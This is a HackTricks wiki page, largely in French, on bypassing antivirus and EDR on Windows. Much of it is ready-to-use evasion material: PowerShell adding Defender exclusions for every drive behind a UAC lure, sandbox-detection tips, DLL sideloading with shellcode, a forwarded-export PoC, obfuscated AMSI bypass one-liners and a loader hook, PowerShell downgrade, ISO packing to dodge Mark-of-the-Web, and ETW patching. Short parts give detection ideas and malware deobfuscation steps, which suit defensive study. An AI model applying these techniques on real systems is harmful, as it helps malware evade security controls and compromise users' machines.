# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour arrêter Windows Defender en se faisant passer pour un autre AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant d'altérer Defender

Les loaders publics se faisant passer pour des game cheats sont fréquemment fournis en tant qu'installateurs Node.js/Nexe non signés qui d'abord **demandent à l'utilisateur une élévation** et ne neutralisent Defender qu'ensuite. Le processus est simple:

1. Vérifier le contexte administratif avec `net session`. La commande ne réussit que lorsque l'appelant possède des droits d'administrateur, donc un échec indique que le loader s'exécute en tant qu'utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` pour déclencher l'invite de consentement UAC attendue tout en préservant la ligne de commande originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes croient déjà qu'elles installent un logiciel “cracked”, donc l'invite est généralement acceptée, donnant au malware les droits nécessaires pour modifier la politique de Defender.

### Exclusions `MpPreference` globales pour chaque lettre de lecteur

Une fois que les privilèges sont élevés, les chaînes de type GachiLoader maximisent les zones d'ombre de Defender au lieu de désactiver complètement le service. Le loader commence par tuer le GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) puis ajoute des **exclusions extrêmement larges** de sorte que chaque profil utilisateur, répertoire système et disque amovible devienne impossible à analyser:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- La boucle parcourt tous les systèmes de fichiers montés (D:\, E:\, clés USB, etc.) donc **tout payload futur déposé n'importe où sur le disque est ignoré**.
- L'exclusion de l'extension `.sys` est tournée vers l'avenir — les attaquants se réservent l'option de charger ultérieurement des drivers non signés sans retoucher Defender.
- Tous les changements sont écrits sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes suivantes de confirmer que les exclusions persistent ou de les étendre sans réactiver UAC.

Comme aucun service Defender n'est arrêté, des vérifications de santé naïves continuent d'indiquer “antivirus active” alors que l'inspection en temps réel ne touche jamais ces chemins.

## **Méthodologie d'évasion AV**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour les AV de détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois il suffit de modifier certaines chaînes dans votre binaire ou script pour passer les AV, mais cela peut prendre du temps selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'existera pas de signatures connues, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Je recommande vivement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion AV pratique.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Selon l'implémentation, c'est une excellente façon de contourner la dynamic analysis des AV. Les AV disposent d'un temps très court pour analyser les fichiers afin de ne pas interrompre l'utilisateur, donc utiliser de longues pauses peut perturber l'analyse des binaires. Le problème est que de nombreuses sandboxes d'AV peuvent tout simplement sauter le sleep selon leur implémentation.
- **Checking machine's resources** En général, les sandboxes ont très peu de ressources (ex. < 2GB RAM), sinon elles ralentiraient la machine de l'utilisateur. Vous pouvez être créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs — tout ne sera pas forcément implémenté dans la sandbox.
- **Machine-specific checks** Si vous voulez cibler un poste joint au domaine "contoso.local", vous pouvez vérifier le domaine de la machine ; si ce n'est pas celui attendu, votre programme peut simplement quitter.

Il s'avère que le computername du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le Sandbox de Defender, et vous pouvez alors quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme dit précédemment, **les public tools** finiront par **être détectés**, donc posez-vous la question suivante :

Par exemple, si vous voulez dumper LSASS, **avez‑vous vraiment besoin d'utiliser mimikatz** ? Ou bien pourriez‑vous utiliser un projet moins connu qui dump aussi LSASS.

La bonne réponse est probablement la seconde. Prenez mimikatz comme exemple : c'est probablement un des projets, si ce n'est le plus, le plus signalé par les AVs et EDRs ; bien que le projet soit super, il est un cauchemar pour contourner les AV, donc cherchez des alternatives pour atteindre votre objectif.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking à l'intérieur de "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement d'**explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez discrète si elle est bien réalisée, mais si vous utilisez des programmes Sideloadable connus publiquement, vous pouvez facilement vous faire repérer.

Le simple fait de placer une DLL malveillante portant le nom que le programme s'attend à charger ne chargera pas nécessairement votre payload, car le programme attend des fonctions spécifiques dans cette DLL ; pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** transfère les appels qu'un programme effectue depuis la proxy (et malveillante) DLL vers la DLL originale, préservant ainsi la fonctionnalité du programme et permettant de gérer l'exécution de votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source pour la DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous recommande **fortement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur DLL Sideloading et aussi [la vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) pour approfondir ce que nous avons abordé.

### Abuser des Forwarded Exports (ForwardSideLoading)

Les modules Windows PE peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Quand un appelant résout l'export, le chargeur Windows va :

- Charger `TargetDll` s'il n'est pas déjà chargé
- Résoudre `TargetFunc` à partir de celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms protégé KnownDLLs (par ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas un KnownDLL, l'ordre normal de recherche de DLL est utilisé, lequel inclut le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive de sideloading indirecte : trouvez une DLL signée qui exporte une fonction forwardée vers un nom de module non-KnownDLL, puis placez cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant nommée exactement comme le module cible forwardé. Quand l'export forwardé est invoqué, le chargeur résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Exemple observé sous Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas une KnownDLL, donc elle est résolue selon l'ordre de recherche normal.

PoC (copier-coller):
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la fonction forwardée pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le forward avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signé) charge en side-by-side `keyiso.dll` (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur "missing API" uniquement après que `DllMain` se soit déjà exécuté

Hunting tips:
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas un KnownDLL. KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l'inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt

Idées de détection/défense :
- Surveillez les LOLBins (par ex., rundll32.exe) chargeant des DLL signées depuis des chemins non-système, suivis du chargement de non-KnownDLLs portant le même nom de base depuis ce répertoire
- Générez une alerte sur des chaînes processus/module comme : `rundll32.exe` → non-système `keyiso.dll` → `NCRYPTPROV.dll` sous des chemins modifiables par l'utilisateur
- Appliquez des politiques d'intégrité du code (WDAC/AppLocker) et refusez les permissions write+execute dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion est un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne comptez jamais sur un seul outil ; si possible, essayez de chaîner plusieurs techniques d'évasion.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". À l'origine, les AV ne pouvaient analyser que les fichiers sur disque, donc si vous pouviez exécuter des payloads directement in-memory, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas suffisamment de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, ou UAC (élévation d'EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, usage interactif et évaluation dynamique de code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Cela permet aux solutions antivirus d'inspecter le comportement des scripts en exposant leur contenu sous une forme à la fois non chiffrée et non obfusquée.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu'il préfixe par `amsi:` puis le chemin vers l'exécutable à partir duquel le script a été lancé, ici powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais nous avons quand même été détectés in-memory à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# passe également par AMSI. Cela affecte même `Assembly.Load(byte[])` pour l'exécution in-memory. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieure) pour l'exécution in-memory si vous voulez échapper à AMSI.

Il existe plusieurs moyens de contourner AMSI :

- **Obfuscation**

Puisque AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous tentez de charger peut donc être une bonne manière d'éviter la détection.

Cependant, AMSI est capable de déobfusquer des scripts même s'ils comportent plusieurs couches, donc l'obfuscation peut être une mauvaise option selon la manière dont elle est réalisée. Cela rend l'évasion moins évidente. Toutefois, parfois il suffit de changer quelques noms de variables pour que ça passe, donc cela dépend du niveau de détection.

- **AMSI Bypass**

Puisqu'AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible d'y intervenir facilement même en tant qu'utilisateur non privilégié. En raison de cette faille d'implémentation d'AMSI, des chercheurs ont découvert plusieurs manières d'éviter l'analyse AMSI.

**Forcing an Error**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) fera en sorte qu'aucune analyse ne sera lancée pour le processus courant. À l'origine cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été détectée par AMSI lui‑même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai tiré de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse de l'entrée fournie par l'utilisateur) et à la remplacer par des instructions renvoyant le code E_INVALIDARG ; de cette façon, le résultat de l'analyse réelle renverra 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe aussi de nombreuses autres techniques pour bypasser AMSI avec powershell, consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (LdrLoadDll hook)

AMSI n'est initialisé que après que `amsi.dll` ait été chargé dans le processus courant. Une contournement robuste et indépendant du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n'a lieu pour ce processus.

Aperçu de l'implémentation (pseudocode x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et des loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À associer à l'alimentation de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande longs.
- Vu utilisé par des loaders exécutés via des LOLBins (par ex., `regsvr32` appelant `DllRegisterServer`).

Cet outil [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) génère également des scripts pour contourner AMSI.

**Remove the detected signature**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Ces outils fonctionnent en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en l'écrasant avec des instructions NOP, la retirant ainsi de la mémoire.

**AV/EDR products that uses AMSI**

Vous pouvez trouver une liste de produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans qu'ils soient analysés par AMSI. Vous pouvez faire cela :
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

PowerShell logging est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging**: Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cet effet.
- **Use Powershell version 2**: Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être analysés par AMSI. Vous pouvez le faire : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer une session PowerShell sans défenses (c'est ce que `powerpick` de Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et facilite sa détection par les AVs et EDRs. Faites attention à cela et appliquez éventuellement le chiffrement uniquement à des sections spécifiques de votre code qui sont sensibles ou doivent être cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware utilisant ConfuserEx 2 (ou ses forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le flux de travail ci‑dessous restaure de façon fiable un IL quasi‑original qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles lors de la construction de votre propre unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Options :
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le flattening du contrôle de flux, restaurera les namespaces, classes et noms de variables d'origine et déchiffrera les chaînes constantes.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

Le processus ci‑dessus restaure le flux d'exécution **sans** avoir besoin d'exécuter l'échantillon malveillant — utile lorsque vous travaillez sur une station hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open-source de la suite de compilation [LLVM] capable d'offrir une sécurité logicielle accrue via [code obfuscation] et une protection anti-manipulation.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation de templates C++ qui rendra la vie de la personne souhaitant casser l'application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer différents fichiers PE, notamment : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur de code métamorphique simple pour des exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code fin pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un crypteur PE .NET écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement sur une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) nommé Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, ainsi que l'URL depuis laquelle ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **fiable** **ne déclencheront pas SmartScreen**.

Une manière très efficace d'empêcher que vos payloads obtiennent le Mark of The Web est de les empaqueter dans une sorte de conteneur comme une ISO. Cela se produit parce que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie pour éviter le Mark-of-the-Web.

Exemple d'utilisation:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démo pour contourner SmartScreen en empaquetant des payloads dans des fichiers ISO en utilisant [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme de journalisation puissant sous Windows qui permet aux applications et composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même façon qu'AMSI est désactivé (contourné), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans enregistrer d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) et [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


